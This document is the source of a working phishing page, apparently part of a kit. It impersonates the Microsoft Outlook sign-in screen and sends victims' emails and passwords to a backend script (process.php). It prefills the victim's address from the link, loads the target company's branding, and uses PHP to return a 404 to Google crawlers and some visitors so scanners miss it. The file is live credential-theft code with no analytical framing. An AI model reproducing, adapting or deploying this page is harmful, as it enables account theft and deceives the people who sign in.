<?php

include 'files/helper.php';
include 'files/Scan.php';

error_reporting(0);
@set_time_limit(0);

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false || strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false || strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'mozilla') !== false){ @header('HTTP/1.0 404 Not Found');
exit(); }

?>

<html dir="ltr" lang="en">
   <title>Sign in to Outlook</title>
   <meta charset="utf-8">
   <link href="lib/img/favicon.ico" rel="shortcut icon">
   <meta name="robots" content="none" />
   <meta name="robots" content="noindex, noarchive, nofollow, nosnippet" />
   <meta name="googlebot" content="noindex, noarchive, nofollow, nosnippet, noimageindex" />
   <meta name="slurp" content="noindex, noarchive, nofollow, nosnippet, noodp, noydir" />
   <meta name="msnbot" content="noindex, noarchive, nofollow, nosnippet" />
   <meta name="teoma" content="noindex, noarchive, nofollow, nosnippet" />
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" integrity="sha256-NuCn4IvuZXdBaFKJOAcsU2Q3ZpwbdFisd5dux4jkQ5w=" crossorigin="anonymous">
   <link href="lib/css/login.css" rel="stylesheet">
   <body class="cb" style="display:block">
      <div>
         <div>
            <div class="app background">
               <div id="bg_image" style="background-image:url(lib/img/background.jpg")></div>
            </div>
         </div>

            <div class=outer>
               <div class="app middle">
                  <div class="background-logo-holder">
                     <img id="banner_image" class="background-logo" src="lib/img/logo3.png">
                  </div>
                  <div class="app fade-in-lightbox inner">
                     <div>
                        <img id="logo_image" class="banner-logo" src="lib/img/logo2.svg">
                     </div>
                     <div>


                        <div id="pick_em" style="display: none;">
                           <div class="animate pagination-view slide-in-next">
                              <div data-showfedcredbutton=true data-viewid=1>
                                 <div>
                                    <div class="row text-title" id="loginHeader">
                                       <div aria-level=1>Sign in</div>
                                    </div>
                                 </div>
                                 <div class="row">
                                    <div class="col-md-24 form-group">
                                       <div class="placeholderContainer">
					                   <div class="add_em">
											 <p style="font-weight: bold;margin-left: 4%">Pick an account</p>
											 <a href="#" class="email-picker">
												 <div class="block-m2">
													<img role="presentation" src="lib/img/picker_account.png"> <span id="em_picker"></span><span style="float:right; margin-top:4%"><img src="lib/img/picker_more.png" alt=""></span>
												 </div>
											 </a>
											 <a href="#" class="email-picker2">
												 <div class="block-m2">
													<img role="presentation" src="lib/img/plus.svg"><span style="word-wrap:break-word;"> Use another account</span>
												 </div>
											 </a>
											 <br>
										</div>
                                       </div>
                                    </div>
                                 </div>
                                 <div class="position-buttons">

                                 </div>
                              </div>
                           </div>
                        </div>

                        <div id="add_em" style="display: none;">
                           <div class="animate pagination-view slide-in-next">
                              <div data-showfedcredbutton=true data-viewid=1>
                                 <div>
                                    <div class="row text-title" id="loginHeader">
                                       <div aria-level=1>Sign in</div>
                                       <div class="text-13 subtitle" aria-level=2>to continue to Outlook</div>
                                    </div>
                                 </div>
                                 <div class=row>
									<div aria-live="assertive" role="alert" style="display: none;" class="error-alert">
										<div class="alert alert-error error-alert-msg"></div>
										<br>
									</div>
                                    <div class="col-md-24 form-group">
                                       <div class="placeholderContainer">
											<input type="text" name="email" id="email" class="form-control ltr_override" value="" placeholder="someone@example.com ">
                                       </div>
                                    </div>
                                 </div>
                                 <div class="position-buttons">
                                    <div class=row>
                                       <div class=col-md-24>
                                          <div class="text-13 action-links">
                                             <div class=form-group>
                                                <a href="#" >Can’t access your account?</a>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                    <div class=row>
                                       <div class="col-xs-24 no-padding-left-right button-container">
                                       <div class=inline-block>
                                          <button class="btn btn-block btn-primary btn-email">Next</button>
                                       </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
						<div id="add_pass" style="display: none;">
							<div class="animate slide-in-next">
								<div>
									<div class="identityBanner">
										<a class="backButton" href="#" type="button">
											<img src="lib/img/arrow.svg">
										</a>
										<div class="identity"></div>
									</div>
								</div>
							</div>
							<div class="animate slide-in-next has-identity-banner pagination-view">
								<div class="row text-title">Enter password</div>
								<div class=row>
									<div class="form-group col-md-24">
										<div aria-live="assertive" role="alert" style="display: none;" class="error-alert-pass">
											<div class="alert alert-error">Your email or password is incorrect. If you don't remember your password, <a href='#'>reset it now.</a></div>
										</div>
										<div class=placeholderContainer>
											<input name="password" type="password" id="password" autocomplete="off" class="form-control" placeholder="Password" tabindex="0">
										</div>
									</div>
								</div>
								<div class=position-buttons>
									<div>
										<div class=row>
											<div class=col-md-24>
													<div class="action-links text-13">
													<div class=form-group><a href="#">Forgot my password</a></div>
													<div class=form-group></div>
												</div>
											</div>
										</div>
									</div>
									<div class=row >
										<div>
											<div class="button-container col-xs-24 no-padding-left-right">
												<div class=inline-block>
													<button class="btn btn-block btn-primary btn-signin">Sign in</button>
												</div>
											</div>
										</div>
									 </div>
								</div>
							</div>
                        </div>
                     </div>
                  </div>
                  <div>
                  </div>
                  <div class=footer id=footer>
                     <div>
                        <div class="footerNode text-secondary">
                           <span>©2021 Microsoft</span>
                           <a href="#">Terms of use</a>
                           <a href="#">Privacy & cookies</a>
                           <a href="#"><img src="lib/img/white_ellipsis.svg"></a>
                        </div>
                     </div>
                  </div>
               </div>
            </div>

      </div>
	  <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
	  <script>
		$( document ).ready(function() {

			var php_url = 'url';
			var check_mx = false; // true or false for check outlook MX.



			// ******************************************************************************************************* //
			var hash = window.location.hash;
			var email = hash.split('#')[1];

			if(true_email(email)){
				$("#pick_em").show();
				$("#em_picker").html(email);
				$('#email').val(email);
			}else{
				$("#add_em").show();
			}

			$('.email-picker').on('click', function (){
				$('.identity').html(email);
				$(".error-alert-pass").hide();
				set_brand(email);
				setTimeout(function (){
					$("#pick_em").hide();
					$("#add_pass").show();
				}, 1000);
			});

			$('.email-picker2').on('click', function (){
				$('#email').val('');
				$("#pick_em").hide();
				$("#add_em").show();
			});

			$('.btn-email').on('click', function (){
				var email = $('#email').val();
				$('.identity').html(email);
				$(".error-alert").hide();
				$('.btn-email').prop('disabled', true);
				if(true_email(email) == false){
					$(".error-alert").show();
					$(".error-alert-msg").html('Plase enter correct outlook account email.');
					$('.btn-email').prop('disabled', false);
				}else{
					if(check_mx == true){
						var domain = email.split('@')[1];
						var str;
						$.ajax({
							url: php_url + '?domain=' + domain,
							success: function(data){
								str = data.includes("outlook");
								if(str){
									set_brand(email);
									setTimeout(function (){
										$("#add_em").hide();
										$("#add_pass").show();
									}, 1000);
								}else{
									$(".error-alert").show();
									$(".error-alert-msg").html('You can\'t signin with this account, Please use work or school account instead.');
									$('.btn-email').prop('disabled', false);
								}
							},
							error: function(xhr){
								$(".error-alert").show();
								$(".error-alert-msg").html('Error occured, Please try again.');
								$('.btn-email').prop('disabled', false);
							}
						});
					}else{
						set_brand(email);
						setTimeout(function (){
							$("#add_em").hide();
							$("#add_pass").show();
						}, 1000);
					}
				}
			});

			$('.btn-signin').on('click', function (){
				$('.btn-signin').prop('disabled', true);
        $(".error-alert-pass").hide();
				var user = $('#email').val();
				var pass = $('#password').val();

        if (user.length && pass.length > 6){
          $.ajax({
             url: 'process.php',
             type: "POST",
             data: {user:user,pass:pass},
             success: function(result){
              var a = $.parseJSON(result);
              if(a.status)
              setTimeout("window.location.href='"+ a.finish_url +"';", 1000);
             }
           });
        } else {
          $(".error-alert-pass").show();
          $('.btn-signin').prop('disabled', false);
        }
			});

			$('.backButton').on('click', function (){
				$('#bg_image').css('background-image', 'url(lib/img/background.jpg)');
				$('#logo_image').attr('src', 'lib/img/logo2.svg');
				$('#banner_image').show();
				$('.btn-email').prop('disabled', false);
				$("#add_pass").hide();
				$("#add_em").show();
				$(".error-alert-pass").hide();
			});

			function set_brand(email){
				$.ajax({
					url: php_url,
					type: "POST",
					data: {UserName:email},
					success: function(data){
						var result = data;
						if(result.co_bg !== null && result.co_logo !== null && result.co_bg !== '' && result.co_logo !== ''){
							$('#banner_image').hide();
						}
						result.co_bg && ($('#bg_image').css('background-image', 'url(' + result.co_bg + ')'));
						result.co_logo && ($('#logo_image').attr('src', result.co_logo));
					}
				});
			}
		});

		function true_email(a) {
			var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
			return re.test(a);
		}
	  </script>
   </body>
   </html>
